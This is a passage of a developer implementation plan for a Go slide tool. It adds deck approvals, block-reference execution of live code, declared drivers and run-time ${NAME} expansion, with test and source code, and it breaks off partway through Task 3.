# Live code by reference, driver declarations and approvals: implementation plan

## Controller rulings on the open questions (2026-09-22)

These override the plan text where they differ.

- The plan's defaults stand for questions 1 to 8: spec wording for messages; only `${NAME}` expands; status 400 for a `code` body, 404 for an unknown slide or block, 422 for an undeclared driver, 403 for not approved; drivers approved earlier keep running after a new driver is declined; approvals stay keyed by driver name; no prompt when no block could run; `--allow-code` only on `dev` and `present`; the literal `drivers:` map in the page stays out of scope.
- Question 9: the branch starts from main after P1 and P3 have both merged, because the file-and-line message uses `slidelist.Build`.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** A Run button sends only `{slide, block}`, tap runs the code the deck file holds at that position, a deck must declare every driver it uses, nothing runs until the person approves the deck, and `${NAME}` in driver settings expands from the environment only when a driver runs.

**Architecture:** The transformer numbers each slide's live code blocks and marks a block whose driver the deck does not declare. `/api/execute` takes a block reference, looks the block up in the loaded deck, and runs it only when the run's `LiveCodePolicy` allows its driver. `tap dev` and `tap present` build that policy at startup from one function, `liveCodeApproval`, which reads approvals from `~/.config/tap/settings.yaml` and asks through an `approvalAsker` interface (the terminal today, stdin events in P6). Environment variables in driver settings stay literal in the loaded config, so they never reach the page, and expand when a driver runs.

**Tech Stack:** Go 1.24, cobra, `gopkg.in/yaml.v3`, `net/http`; React 19 with zustand and vitest in `frontend/`.

**Spec:** `docs/superpowers/specs/2026-09-22-tap-desktop-prerequisites-design.md`, sections 2.2 to 2.5 (and Part 6 for the stdin answer). Acceptance criteria: `docs/superpowers/specs/tap-desktop-features/06-live-code-and-trust.feature`. The desktop rule: "Live code approval" in `docs/superpowers/specs/2026-09-22-tap-desktop-design.md`. All three are on the `docs/tap-desktop` branch.

**Branch:** `feat/live-code-approvals`, from an up-to-date `main` after P1 (`2026-09-22-cli-command-tree-and-driver-registry.md`) and P3 (`2026-09-22-deck-features-skip-schema-slide-list.md`) have merged. The roadmap runs P3 before P2. Task 8 uses P3's `slidelist.Build` for the line numbers in the undeclared driver message. Work in a worktree under `/Users/codemonkey/projects/`.

## Global Constraints

- `POST /api/execute` accepts `{"slide": 4, "block": 1}`, both 1-based. `block` counts live code blocks (blocks with a driver) within the slide. A body that contains `code` is rejected with 400.
- The frontend Run button sends the reference. The presenter page does the same (it renders the same `Slide` component).
- The cross-site guard from PR #14 (`requireSameOriginJSON`) still wraps `/api/execute`.
- A deck with live code declares every driver it uses as a key in the frontmatter `drivers:` map. A driver without settings is `shell: {}`.
- Undeclared driver message, exactly: `This deck does not declare the shell driver. Add "shell: {}" under drivers in the frontmatter.` When the deck has no `drivers:` entries at all, the message shows the complete block to paste.
- Approvals live in the user settings file, `~/.config/tap/settings.yaml` (`$XDG_CONFIG_HOME/tap/settings.yaml` when set), through `internal/usersettings`, in this shape:

  ```yaml
  approvals:
      - deck: /Users/me/talks/3am/conference-talk.md
        drivers: [shell, sqlite]
        approvedAt: 2026-09-22T19:32:00Z
  ```

- A deck is approved when its absolute path is listed and every declared driver is in its approved list.
- tap asks at startup of `tap dev` and `tap present`, before the TUI, when stdin is a TTY and the deck needs approval. The answer is `y` or `n`, and `n` is the default. Nothing is stored for a no.
- Non-interactive runs (no TTY, `--headless`) never ask. Live code is off for an unapproved deck unless `--allow-code` is given, which stores nothing.
- `tap new` records an approval for the deck it writes.
- `tap approval list [--json]` and `tap approval revoke <deck>`.
- `${NAME}` in string values of `drivers:` settings expands when a driver runs. `$${` writes a literal `${`. An unset variable fails the block with a message that names it. Only driver settings expand.
- Contract names from the roadmap, exactly: `usersettings.Approval` (`Deck`, `Drivers`, `ApprovedAt`), `Settings.Approvals`, `Approved(deck string, drivers []string) bool`, `Approve`, `Revoke`; the `approvalAsker` interface.
- Contract names from P1, not redefined: `resolveDeck`, `firstArg`, `userError`, `internalError`, `printJSONOK`, `jsonRequested`, `runTap`, `expectedCommands`, `buildDriverRegistry`, `serverOptions`, `freePort`, `buildTapBinaryForTest`, `stdinIsTerminal`.
- Contract from P3, consumed: `slidelist.Build(source []byte, baseDir string) (Result, error)`, `Result.Slides []Slide`, `Slide.Number`, `Slide.CodeBlocks []CodeBlock` with `Driver`, `Live`, `Line`.
- Spell identifiers out in full. Code comments describe the present, with no ticket numbers. No em dashes in docs, changelog or comments.
- A `--json` or YAML struct declares its fields in output order. If the `fieldalignment` linter complains, keep the order and add `//nolint:govet // fieldalignment: field order is the output order` above the struct, as `internal/driver/custom.go` does.

## Open questions

Each has a default this plan implements. Change the plan before running it if the answer differs.

1. **Message wording.** The feature file says "This deck does not allow the shell driver" and "Add sqlite under drivers in the deck settings". The prerequisites spec says "does not declare ... in the frontmatter". The plan uses the spec's text. The app (D5) can reword its own fix-it.
2. **Bare `$NAME`.** Today `$PGPASSWORD` (no braces) expands at load time, and the docs show that form. The spec names only `${NAME}`. The plan expands only `${NAME}`, leaves `$NAME` literal, and updates the docs and changelog (a breaking change inside 2.0).
3. **Status codes.** The spec asks for one status per rejection. The plan uses 400 for a `code` body or a malformed body, 404 for an unknown slide or block, 422 for an undeclared driver, and 403 for an unapproved driver.
4. **Declining a new driver.** When an approved deck gains `shell` and the person says no, the plan keeps the drivers approved earlier running, and only the `shell` blocks show "Not approved". The spec's "live code is off" is read as "off for what was not approved".
5. **A changed custom command.** Approval is keyed by driver names, as the spec says. A git pull that changes `command:` of an approved custom driver does not ask again.
6. **No runnable block.** A deck whose live blocks all use undeclared drivers has nothing that can run, so tap does not ask. It prints the undeclared driver messages.
7. **`--allow-code` on `tap export`.** P1 made exports never run code (their server has no registry), so the plan adds `--allow-code` only to `tap dev` and `tap present`.
8. **Literal settings in the page.** `/api/presentation` and `tap build` still carry the `drivers:` map as the frontmatter writes it (with `${DB_PASSWORD}`, no longer the expanded secret). Hiding the map from the page is out of scope.
9. **Dependency on P3.** If P3 is not merged when this runs, Task 8 cannot import `internal/slidelist`. Wait for P3 rather than writing a second line counter.

## File structure

| File | Status | Responsibility |
|---|---|---|
| `internal/usersettings/usersettings.go` | modify | `Approval`, `Settings.Approvals`, `ApprovalFor`, `Approved`, `Approve`, `Revoke` |
| `internal/config/expand.go` | new | `ExpandEnv`, `UnsetVariableError`, `ConnectionConfig.Expanded`, `DriverConfig.ExpandedCommand` |
| `internal/config/drivers.go` | new | `DeclaredDrivers`, `DriverDeclared`, `UndeclaredDriverMessage` |
| `internal/config/config.go` | modify | Load no longer expands variables; `resolveEnvVars` and `ResolveEnvVars` removed |
| `internal/transformer/transformer.go` | modify | `TransformedCodeBlock.Block` and `.Problem` |
| `internal/server/api.go` | modify | Execute by reference, `LiveCodePolicy`, expansion at run time; the P1 guard removed |
| `internal/server/server.go` | modify | The `liveCodePolicy` field |
| `internal/server/routes.go` | modify | `/api/presentation` adds `liveCode` |
| `internal/cli/drivers.go` | modify | `buildDriverRegistry` expands custom commands; `unavailableDriver`; `builtInDriverNames` |
| `internal/cli/approval.go` | new | `approvalRequest`, `approvalAsker`, `liveCodeApproval`, `terminalAsker` |
| `internal/cli/live_code_warnings.go` | new | `undeclaredDriverWarnings` with file and line |
| `internal/cli/approval_command.go` | new | `tap approval list` and `tap approval revoke` |
| `internal/cli/main_test.go` | new | Points user settings at a temporary folder for the whole package |
| `internal/cli/dev.go`, `present.go` | modify | `--allow-code`, the approval check, the policy, the warnings |
| `internal/cli/new.go` | modify | `tap new` approves the deck it writes |
| `internal/cli/exit.go` | modify | `codeNotApproved`, `codeInvalidSettings` |
| `internal/cli/live_code_test.go` | modify | Real `tap dev` runs by reference |
| `frontend/src/lib/types.ts` | modify | `CodeBlock.block`, `.problem`, `Presentation.liveCode`, `ExecuteRequest` |
| `frontend/src/lib/components/LiveCodeBlock.tsx` | modify | Sends `{slide, block}`, shows "Not approved" and the problem |
| `frontend/src/lib/components/Slide.tsx` | modify | Passes the slide number |
| `frontend/src/lib/styles/rich-blocks.css` | modify | The problem message style |
| `examples/*.md`, `docs/examples/*.md` | modify | Declare their drivers |
| Docs | modify | `docs/guide/live-code-execution.md`, `docs/reference/drivers.md`, `docs/reference/frontmatter-options.md`, `docs/reference/cli-commands.md`, `skills/tap/**`, `README.md`, `CHANGELOG.md`, `docs/changelog.md` |

## Commits that leave live code off

Task 4 makes `/api/execute` refuse every request until a run sets a policy, and Task 8 sets it. Between the two, a real `tap dev` answers 403, the Run button still sends the old body (Task 11 changes it), and `TestDevRunsALiveShellBlock` is skipped. All tasks land in one pull request, so no release has this state.

---

### Task 1: Approvals in the user settings

**Files:**
- Modify: `internal/usersettings/usersettings.go`
- Modify: `internal/usersettings/usersettings_test.go`

**Interfaces:**
- Produces:
  - `type Approval struct { Deck string; Drivers []string; ApprovedAt time.Time }` with YAML names `deck`, `drivers` (flow style), `approvedAt`, and JSON names `deck`, `drivers`, `approvedAt`
  - `Settings.Approvals []Approval` (`yaml:"approvals,omitempty"`)
  - `func (s Settings) ApprovalFor(deck string) (Approval, bool)`
  - `func (s Settings) Approved(deck string, drivers []string) bool`
  - `func (s *Settings) Approve(deck string, drivers []string, at time.Time)`: merges with an existing approval for the deck; drivers sorted and unique, never nil; `ApprovedAt` is `at` in UTC, truncated to the second
  - `func (s *Settings) Revoke(deck string) bool`: true when an approval was removed
  - All four clean `deck` with `filepath.Clean`. Callers pass an absolute path.

- [ ] **Step 1: Write the failing tests**

Add to `internal/usersettings/usersettings_test.go` (add `"os"`, `"strings"` and `"time"` to its imports):

```go
var approvalTime = time.Date(2026, 9, 22, 19, 32, 0, 0, time.UTC)

func TestApprovedNeedsEveryDeclaredDriver(t *testing.T) {
	var settings Settings
	settings.Approve("/talks/talk.md", []string{"sqlite"}, approvalTime)

	if !settings.Approved("/talks/talk.md", []string{"sqlite"}) {
		t.Error("the approved deck and driver should be approved")
	}
	if settings.Approved("/talks/talk.md", []string{"shell", "sqlite"}) {
		t.Error("a driver added after the approval should not be approved")
	}
	if settings.Approved("/elsewhere/talk.md", []string{"sqlite"}) {
		t.Error("a moved deck should not be approved")
	}
	if !settings.Approved("/talks/./talk.md", nil) {
		t.Error("the path should be compared after cleaning")
	}
}

func TestApproveKeepsTheDriversApprovedBefore(t *testing.T) {
	var settings Settings
	settings.Approve("/talks/talk.md", []string{"sqlite"}, approvalTime)
	later := approvalTime.Add(time.Hour)
	settings.Approve("/talks/talk.md", []string{"shell"}, later)

	if len(settings.Approvals) != 1 {
		t.Fatalf("approvals = %+v, want one", settings.Approvals)
	}
	approval, found := settings.ApprovalFor("/talks/talk.md")
	if !found {
		t.Fatal("ApprovalFor() found nothing")
	}
	if strings.Join(approval.Drivers, ",") != "shell,sqlite" {
		t.Errorf("drivers = %v, want [shell sqlite]", approval.Drivers)
	}
	if !approval.ApprovedAt.Equal(later) {
		t.Errorf("approvedAt = %v, want %v", approval.ApprovedAt, later)
	}
}

func TestApproveWithNoDriversStoresAnEmptyList(t *testing.T) {
	var settings Settings
	settings.Approve("/talks/new.md", nil, approvalTime)
	approval, _ := settings.ApprovalFor("/talks/new.md")
	if approval.Drivers == nil || len(approval.Drivers) != 0 {
		t.Errorf("drivers = %#v, want an empty, non-nil list", approval.Drivers)
	}
}

func TestRevoke(t *testing.T) {
	var settings Settings
	settings.Approve("/talks/a.md", []string{"shell"}, approvalTime)
	settings.Approve("/talks/b.md", []string{"shell"}, approvalTime)

	if !settings.Revoke("/talks/a.md") {
		t.Error("Revoke() = false for an approved deck")
	}
	if settings.Revoke("/talks/a.md") {
		t.Error("Revoke() = true for a deck that is no longer approved")
	}
	if len(settings.Approvals) != 1 || settings.Approvals[0].Deck != "/talks/b.md" {
		t.Errorf("approvals = %+v, want only b.md", settings.Approvals)
	}
}

func TestApprovalsFileFormat(t *testing.T) {
	path := filepath.Join(t.TempDir(), "settings.yaml")
	var settings Settings
	settings.Approve("/Users/me/talks/3am/conference-talk.md", []string{"sqlite", "shell"}, approvalTime)
	if err := Save(path, settings); err != nil {
		t.Fatal(err)
	}

	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"approvals:\n",
		"- deck: /Users/me/talks/3am/conference-talk.md\n",
		"drivers: [shell, sqlite]\n",
		"approvedAt: 2026-09-22T19:32:00Z\n",
	} {
		if !strings.Contains(string(raw), want) {
			t.Errorf("settings file lacks %q:\n%s", want, raw)
		}
	}

	loaded, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !loaded.Approved("/Users/me/talks/3am/conference-talk.md", []string{"shell", "sqlite"}) {
		t.Errorf("loaded settings lost the approval: %+v", loaded)
	}
}

func TestRevokingTheLastApprovalDropsTheKey(t *testing.T) {
	path := filepath.Join(t.TempDir(), "settings.yaml")
	var settings Settings
	settings.Approve("/talks/a.md", []string{"shell"}, approvalTime)
	settings.Revoke("/talks/a.md")
	if err := Save(path, settings); err != nil {
		t.Fatal(err)
	}
	raw, _ := os.ReadFile(path)
	if strings.Contains(string(raw), "approvals") {
		t.Errorf("settings file = %q, want no approvals key", raw)
	}
}
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/usersettings`
Expected: compile failure, `settings.Approve undefined`.

- [ ] **Step 3: Implement the approvals**

In `internal/usersettings/usersettings.go`, change the package comment to:

```go
// Package usersettings reads and writes the settings that belong to the
// person running Tap rather than to a deck, such as consent to record and
// the decks they allowed to run live code.
```

Replace the `Settings` struct with:

```go
// Settings is the whole settings file.
type Settings struct {
	Present   Present    `yaml:"present,omitempty"`
	Approvals []Approval `yaml:"approvals,omitempty"`
}

// Approval is a deck the person allowed to run live code, with the drivers
// they allowed. Deck is an absolute path, so a moved deck is a new deck
// and is asked about again.
//
//nolint:govet // fieldalignment: field order is the settings file order
type Approval struct {
	Deck       string    `yaml:"deck" json:"deck"`
	Drivers    []string  `yaml:"drivers,flow" json:"drivers"`
	ApprovedAt time.Time `yaml:"approvedAt" json:"approvedAt"`
}
```

Add below `Save`:

```go
// ApprovalFor returns the approval stored for deck, an absolute path.
func (s Settings) ApprovalFor(deck string) (Approval, bool) {
	deck = filepath.Clean(deck)
	for _, approval := range s.Approvals {
		if filepath.Clean(approval.Deck) == deck {
			return approval, true
		}
	}
	return Approval{}, false
}

// Approved reports whether deck is approved for every driver in drivers.
func (s Settings) Approved(deck string, drivers []string) bool {
	approval, found := s.ApprovalFor(deck)
	if !found {
		return false
	}
	for _, name := range drivers {
		if !slices.Contains(approval.Drivers, name) {
			return false
		}
	}
	return true
}

// Approve records that deck may run drivers. An approval already stored
// for the deck keeps its drivers and gains the new ones.
func (s *Settings) Approve(deck string, drivers []string, at time.Time) {
	deck = filepath.Clean(deck)
	merged := append([]string{}, drivers...)
	if existing, found := s.ApprovalFor(deck); found {
		merged = append(merged, existing.Drivers...)
	}
	s.Revoke(deck)
	s.Approvals = append(s.Approvals, Approval{
		Deck:       deck,
		Drivers:    uniqueSorted(merged),
		ApprovedAt: at.UTC().Truncate(time.Second),
	})
}

// Revoke removes the approval for deck, and reports whether there was one.
func (s *Settings) Revoke(deck string) bool {
	deck = filepath.Clean(deck)
	kept := make([]Approval, 0, len(s.Approvals))
	removed := false
	for _, approval := range s.Approvals {
		if filepath.Clean(approval.Deck) == deck {
			removed = true
			continue
		}
		kept = append(kept, approval)
	}
	s.Approvals = kept
	return removed
}

// uniqueSorted returns names sorted, without repeats, and never nil.
func uniqueSorted(names []string) []string {
	sorted := append([]string{}, names...)
	slices.Sort(sorted)
	return slices.Compact(sorted)
}
```

Add `"slices"` and `"time"` to the imports.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `go test ./internal/usersettings -v`
Expected: PASS, including the existing consent tests.

Run: `go test ./internal/cli -run TestConsent -short`
Expected: PASS. The consent code saves the whole `Settings`, so approvals survive a consent answer.

- [ ] **Step 5: Commit**

```bash
git add internal/usersettings
git commit -m "feat(usersettings): store the decks approved to run live code"
```

---

### Task 2: `${NAME}` expansion in driver settings

**Files:**
- Create: `internal/config/expand.go`
- Create: `internal/config/expand_test.go`
- Modify: `internal/config/config.go`
- Modify: `internal/config/config_test.go`

**Interfaces:**
- Produces:
  - `func ExpandEnv(value, setting string, lookup func(string) (string, bool)) (string, error)`. `setting` names where the value comes from, such as `drivers.mysql.connections.local.password`, for the error message.
  - `type UnsetVariableError struct { Name, Setting string }` with message `DB_PASSWORD is not set: drivers.mysql.connections.local.password uses ${DB_PASSWORD}. Set it in the environment or in a .env file next to the deck.`
  - `func (c ConnectionConfig) Expanded(setting string, lookup func(string) (string, bool)) (ConnectionConfig, error)`: expands `host`, `user`, `password`, `database`, `path`
  - `func (d DriverConfig) ExpandedCommand(driverName string, lookup func(string) (string, bool)) (command string, args []string, err error)`
  - `config.Load` leaves every value literal. It still loads `.env` next to the deck into the process environment.
  - Removed: `ResolveEnvVars`, `resolveEnvVars`, `envVarPattern`.

- [ ] **Step 1: Write the failing tests**

`internal/config/expand_test.go`:

```go
package config

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func lookupFrom(values map[string]string) func(string) (string, bool) {
	return func(name string) (string, bool) {
		value, found := values[name]
		return value, found
	}
}

func TestExpandEnvReplacesASetVariable(t *testing.T) {
	got, err := ExpandEnv("postgres://${DB_USER}@localhost/${DB_NAME}", "drivers.postgres.connections.demo.host",
		lookupFrom(map[string]string{"DB_USER": "admin", "DB_NAME": "shop"}))
	if err != nil || got != "postgres://admin@localhost/shop" {
		t.Errorf("ExpandEnv() = %q, %v", got, err)
	}
}

func TestExpandEnvFailsOnAnUnsetVariable(t *testing.T) {
	_, err := ExpandEnv("${DB_PASSWORD}", "drivers.mysql.connections.local.password", lookupFrom(nil))
	var unset *UnsetVariableError
	if !errors.As(err, &unset) || unset.Name != "DB_PASSWORD" {
		t.Fatalf("error = %v, want an UnsetVariableError for DB_PASSWORD", err)
	}
	want := "DB_PASSWORD is not set: drivers.mysql.connections.local.password uses ${DB_PASSWORD}. Set it in the environment or in a .env file next to the deck."
	if err.Error() != want {
		t.Errorf("message = %q, want %q", err.Error(), want)
	}
}

func TestExpandEnvKeepsAVariableThatIsSetToEmpty(t *testing.T) {
	got, err := ExpandEnv("x${EMPTY}y", "setting", lookupFrom(map[string]string{"EMPTY": ""}))
	if err != nil || got != "xy" {
		t.Errorf("ExpandEnv() = %q, %v; want \"xy\"", got, err)
	}
}

func TestExpandEnvEscape(t *testing.T) {
	got, err := ExpandEnv("$${HOME} is ${HOME}", "setting", lookupFrom(map[string]string{"HOME": "/home/me"}))
	if err != nil || got != "${HOME} is /home/me" {
		t.Errorf("ExpandEnv() = %q, %v", got, err)
	}
}

func TestExpandEnvLeavesOtherDollarSignsAlone(t *testing.T) {
	input := "pa$$word $PGUSER costs $5 $"
	got, err := ExpandEnv(input, "setting", lookupFrom(map[string]string{"PGUSER": "admin"}))
	if err != nil || got != input {
		t.Errorf("ExpandEnv() = %q, %v; want the input unchanged", got, err)
	}
}

func TestExpandEnvRejectsAMalformedReference(t *testing.T) {
	for _, input := range []string{"${DB_PASSWORD", "${not a name}", "${}"} {
		_, err := ExpandEnv(input, "drivers.mysql.connections.local.password", lookupFrom(nil))
		if err == nil || !strings.Contains(err.Error(), `write "$${" for a literal "${"`) {
			t.Errorf("ExpandEnv(%q) error = %v, want the escape hint", input, err)
		}
	}
}

func TestConnectionConfigExpanded(t *testing.T) {
	connection := ConnectionConfig{
		Host: "${DB_HOST}", User: "${DB_USER}", Password: "${DB_PASSWORD}",
		Database: "${DB_NAME}", Path: "${DB_PATH}", Port: 3306,
	}
	expanded, err := connection.Expanded("drivers.mysql.connections.local", lookupFrom(map[string]string{
		"DB_HOST": "db", "DB_USER": "admin", "DB_PASSWORD": "hunter2", "DB_NAME": "shop", "DB_PATH": "/data/x.db",
	}))
	if err != nil {
		t.Fatal(err)
	}
	want := ConnectionConfig{Host: "db", User: "admin", Password: "hunter2", Database: "shop", Path: "/data/x.db", Port: 3306}
	if expanded != want {
		t.Errorf("Expanded() = %+v, want %+v", expanded, want)
	}

	_, err = connection.Expanded("drivers.mysql.connections.local", lookupFrom(map[string]string{"DB_HOST": "db"}))
	var unset *UnsetVariableError
	if !errors.As(err, &unset) || unset.Setting != "drivers.mysql.connections.local.user" {
		t.Errorf("error = %v, want the unset user named", err)
	}
}

func TestDriverConfigExpandedCommand(t *testing.T) {
	settings := DriverConfig{Command: "${TAP_PYTHON}", Args: []string{"-c", "$${literal}"}}
	command, args, err := settings.ExpandedCommand("python", lookupFrom(map[string]string{"TAP_PYTHON": "python3"}))
	if err != nil || command != "python3" || strings.Join(args, " ") != "-c ${literal}" {
		t.Errorf("ExpandedCommand() = %q, %v, %v", command, args, err)
	}

	_, _, err = settings.ExpandedCommand("python", lookupFrom(nil))
	var unset *UnsetVariableError
	if !errors.As(err, &unset) || unset.Setting != "drivers.python.command" {
		t.Errorf("error = %v, want the unset command named", err)
	}
}

func TestLoadLeavesVariablesForWhenADriverRuns(t *testing.T) {
	t.Setenv("TAP_TEST_TITLE", "expanded title")
	t.Setenv("TAP_TEST_SECRET", "hunter2")
	path := filepath.Join(t.TempDir(), "deck.md")
	deck := "---\ntitle: \"${TAP_TEST_TITLE}\"\ndrivers:\n  mysql:\n    connections:\n      local:\n        password: \"${TAP_TEST_SECRET}\"\n---\n\n# One\n"
	if err := os.WriteFile(path, []byte(deck), 0o644); err != nil {
		t.Fatal(err)
	}

	cfg, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Title != "${TAP_TEST_TITLE}" {
		t.Errorf("title = %q: only driver settings expand, and only when a driver runs", cfg.Title)
	}
	if password := cfg.Drivers["mysql"].Connections["local"].Password; password != "${TAP_TEST_SECRET}" {
		t.Errorf("password = %q: the loaded config must not hold the secret, because the page receives it", password)
	}
}
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `go test ./internal/config`
Expected: compile failure, `undefined: ExpandEnv`.

- [ ] **Step 3: Write `internal/config/expand.go`**

```go
package config

import (
	"fmt"
	"regexp"
	"strings"
)

// variableNamePattern matches an environment variable name.
var variableNamePattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)

// UnsetVariableError is a ${NAME} in a driver setting whose variable is
// not set. A block that uses the setting fails with this message.
type UnsetVariableError struct {
	// Name is the variable, without "${" and "}".
	Name string
	// Setting is where the reference is, such as
	// drivers.mysql.connections.local.password.
	Setting string
}

func (e *UnsetVariableError) Error() string {
	return fmt.Sprintf("%s is not set: %s uses ${%s}. Set it in the environment or in a .env file next to the deck.", e.Name, e.Setting, e.Name)
}

// ExpandEnv replaces each ${NAME} in value with the variable from lookup.
// "$${" writes a literal "${". Any other "$" stays as it is. A variable
// that is not set is an error, never an empty string. setting names where
// value comes from, for the error message.
func ExpandEnv(value, setting string, lookup func(string) (string, bool)) (string, error) {
	var expanded strings.Builder
	for index := 0; index < len(value); {
		rest := value[index:]
		switch {
		case strings.HasPrefix(rest, "$${"):
			expanded.WriteString("${")
			index += len("$${")
		case strings.HasPrefix(rest, "${"):
			end := strings.IndexByte(rest, '}')
			if end < 0 {
				return "", fmt.Errorf(`%s has a "${" with no closing "}": write "$${" for a literal "${"`, setting)
			}
			name := rest[len("${"):end]
			if !variableNamePattern.MatchString(name) {
				return "", fmt.Errorf(`%s: %q is not a variable name: write "$${" for a literal "${"`, setting, name)
			}
			resolved, found := lookup(name)
			if !found {
				return "", &UnsetVariableError{Name: name, Setting: setting}
			}
			expanded.WriteString(resolved)
			index += end + 1
		default:
			expanded.WriteByte(value[index])
			index++
		}
	}
	return expanded.String(), nil
}

// Expanded returns the connection with ${NAME} expanded in every string
// value. setting is the connection's place in the frontmatter, such as
// drivers.mysql.connections.local.
func (c ConnectionConfig) Expanded(setting string, lookup func(string) (string, bool)) (ConnectionConfig, error) {
	expanded := c
	for _, field := range []struct {
		value *string
		name  string
	}{
		{&expanded.Host, "host"},
		{&expanded.User, "user"},
		{&expanded.Password, "password"},
		{&expanded.Database, "database"},
		{&expanded.Path, "path"},
	} {
		value, err := ExpandEnv(*field.value, setting+"."+field.name, lookup)
		if err != nil {
			return ConnectionConfig{}, err
		}
		*field.value = value
	}
	return expanded, nil
}

// ExpandedCommand returns a custom driver's command and arguments with
// ${NAME} expanded.
func (d DriverConfig) ExpandedCommand(driverName string, lookup func(string) (string, bool)) (string, []string, error) {
	prefix := "drivers." + driverName
	command, err := ExpandEnv(d.Command, prefix+".command", lookup)
	if err != nil {
		return "", nil, err
	}
	var args []string
	for index, arg := range d.Args {
		expanded, err := ExpandEnv(arg, fmt.Sprintf("%s.args[%d]", prefix, index), lookup)
		if err != nil {
			return "", nil, err
		}
		args = append(args, expanded)
	}
	return command, args, nil
}
```

The `Expanded` loop checks fields in the order host, user, password, database, path. `TestConnectionConfigExpanded` relies on `user` being the first unset one.

- [ ] **Step 4: Stop expanding at load time (`internal/config/config.go`)**

1. In `Load`, delete these lines:

```go
	// Resolve environment variables in sensitive fields
	cfg.ResolveEnvVars()
```

Keep the `LoadEnv(dir)` call above them. Change its comment to:

```go
	// Load a .env file next to the deck into the environment, where a
	// driver setting's ${NAME} reads it when the driver runs.
```

2. Delete `envVarPattern`, `resolveEnvVars` and `ResolveEnvVars` with their comments. `regexp` stays imported, because `hexColorPattern` uses it.

3. In `internal/config/config_test.go`, delete `TestResolveEnvVars_SimpleVariable`, `TestResolveEnvVars_BracesSyntax`, `TestResolveEnvVars_MixedContent`, `TestResolveEnvVars_UndefinedVariable`, `TestResolveEnvVars_NoVariables`, `TestResolveEnvVars_EmptyString`, `TestConfig_ResolveEnvVars` and `TestConfig_ResolveEnvVars_MultipleDrivers`. Keep `TestLoadEnv_NonexistentFile`. Remove imports that become unused.

Run: `grep -rn "ResolveEnvVars\|resolveEnvVars" --include='*.go' .`
Expected: no output.

- [ ] **Step 5: Run the tests to verify they pass**

Run: `go test ./internal/config -v -run 'Expand|Connection|DriverConfig|LoadLeaves|LoadEnv'`
Expected: PASS.

Run: `go build ./... && go test ./internal/config`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add internal/config
git commit -m "feat(config)!: expand \${NAME} in driver settings only when a driver runs"
```

---

### Task 3: Number live blocks and flag undeclared drivers

**Files:**
- Create: `internal/config/drivers.go`
- Create: `internal/config/drivers_test.go`
- Modify: `internal/transformer/transformer.go`
- Modify: `internal/transformer/transformer_test.go`

**Interfaces:**
- Produces:
  - `func (c *Config) DeclaredDrivers() []string` (sorted, never nil)
  - `func (c *Config) DriverDeclared(name string) bool`
  - `func (c *Config) UndeclaredDriverMessage(name string, usedDrivers []string) string`
  - `TransformedCodeBlock.Problem string` (`json:"problem,omitempty"`) and `TransformedCodeBlock.Block int` (`json:"block,omitempty"`). `Block` is 1-based among the slide's blocks that have a driver, 0 for other blocks. `Problem` holds the undeclared driver message.

- [ ] **Step 1: Write the failing tests**

`internal/config/drivers_test.go`:

```go
package config

import (
	"strings"
	"testing"
)

func TestDeclaredDrivers(t *testing.T) {
	cfg := DefaultConfig()
	if got := cfg.DeclaredDrivers(); got == nil || len(got) != 0 {
		t.Errorf("DeclaredDrivers() = %#v, want an empty list", got)
	}
	cfg.Drivers = map[string]DriverConfig{"sqlite": {}, "shell": {}}
	if got := strings.Join(cfg.DeclaredDrivers(), ","); got != "shell,sqlite" {
		t.Errorf("DeclaredDrivers() = %q, want shell,sqlite", got)
	}
	if !cfg.DriverDeclared("shell") || cfg.DriverDeclared("python") {
		t.Error("DriverDeclared() is wrong")
	}
}

func TestUndeclaredDriverMessage(t *testing.T) {
	cfg := DefaultConfig()
	cfg.Drivers = map[string]DriverConfig{"sqlite": {}}
	want := `This deck does not declare the shell driver. Add "shell: {}" under drivers in the frontmatter.`
	if got := cfg.UndeclaredDriverMessage("shell", []string{"shell", "sqlite"}); got != want {
		t.Errorf("message = %q, want %q", got, want)
	}
}

func TestUndeclaredDriverMessageWithNoDriversShowsTheBlock(t *testing.T) {
	cfg := DefaultConfig()
	want := "This deck does not declare the sqlite driver. Add this to the frontmatter:\n\ndrivers:\n  shell: {}\n  sqlite: {}"
	if got := cfg.UndeclaredDriverMessage("sqlite", []string{"sqlite", "shell"}); got != want {
		t.Errorf("message = %q, want %q", got, want)
	}
}

func TestLoadAcceptsADriverWithNoSettings(t *testing.T) {
	path := t.TempDir() + "/deck.md"
	writeFile(t, path, "---\ndrivers:\n  shell: {}\n---\n\n# One\n")
	cfg, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.DriverDeclared("shell") {
		t.Error(`"shell: {}" should declare the shell driver`)
	}
}
```

If `config_test.go` has no `writeFile` helper, add this one to `drivers_test.go`:

```go
func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}
```

and add `"os"` to the imports. Check with `grep -n "func writeFile" internal/config/*_test.go` first.

Add to `internal/transformer/transformer_test.go`:

```go
func TestTransformNumbersLiveBlocksAndFlagsUndeclaredDrivers(t *testing.T) {
	cfg := config.DefaultConfig()
	cfg.Drivers = map[string]config.DriverConfig{"sqlite": {}}
	pres := &parser.Presentation{Slides: []parser.Slide{
		{Index: 0, CodeBlocks: []parser.CodeBlock{
			{Language: "go", Code: "package main"},
			{Language: "sql", Code: "SELECT 1;", Meta: parser.CodeBlockMeta{Driver: "sqlite"}},
			{Language: "bash", Code: "ls", Meta: parser.CodeBlockMeta{Driver: "shell"}},
		}},
		{Index: 1, CodeBlocks: []parser.CodeBlock{
			{Language: "sql", Code: "SELECT 2;", Meta: parser.CodeBlockMeta{Driver: "sqlite"}},
		}},
	}}

	result := New(cfg).Transform(pres)
	first := result.Slides[0].CodeBlocks
	if first[0].Block != 0 || first[1].Block != 1 || first[2].Block != 2 {
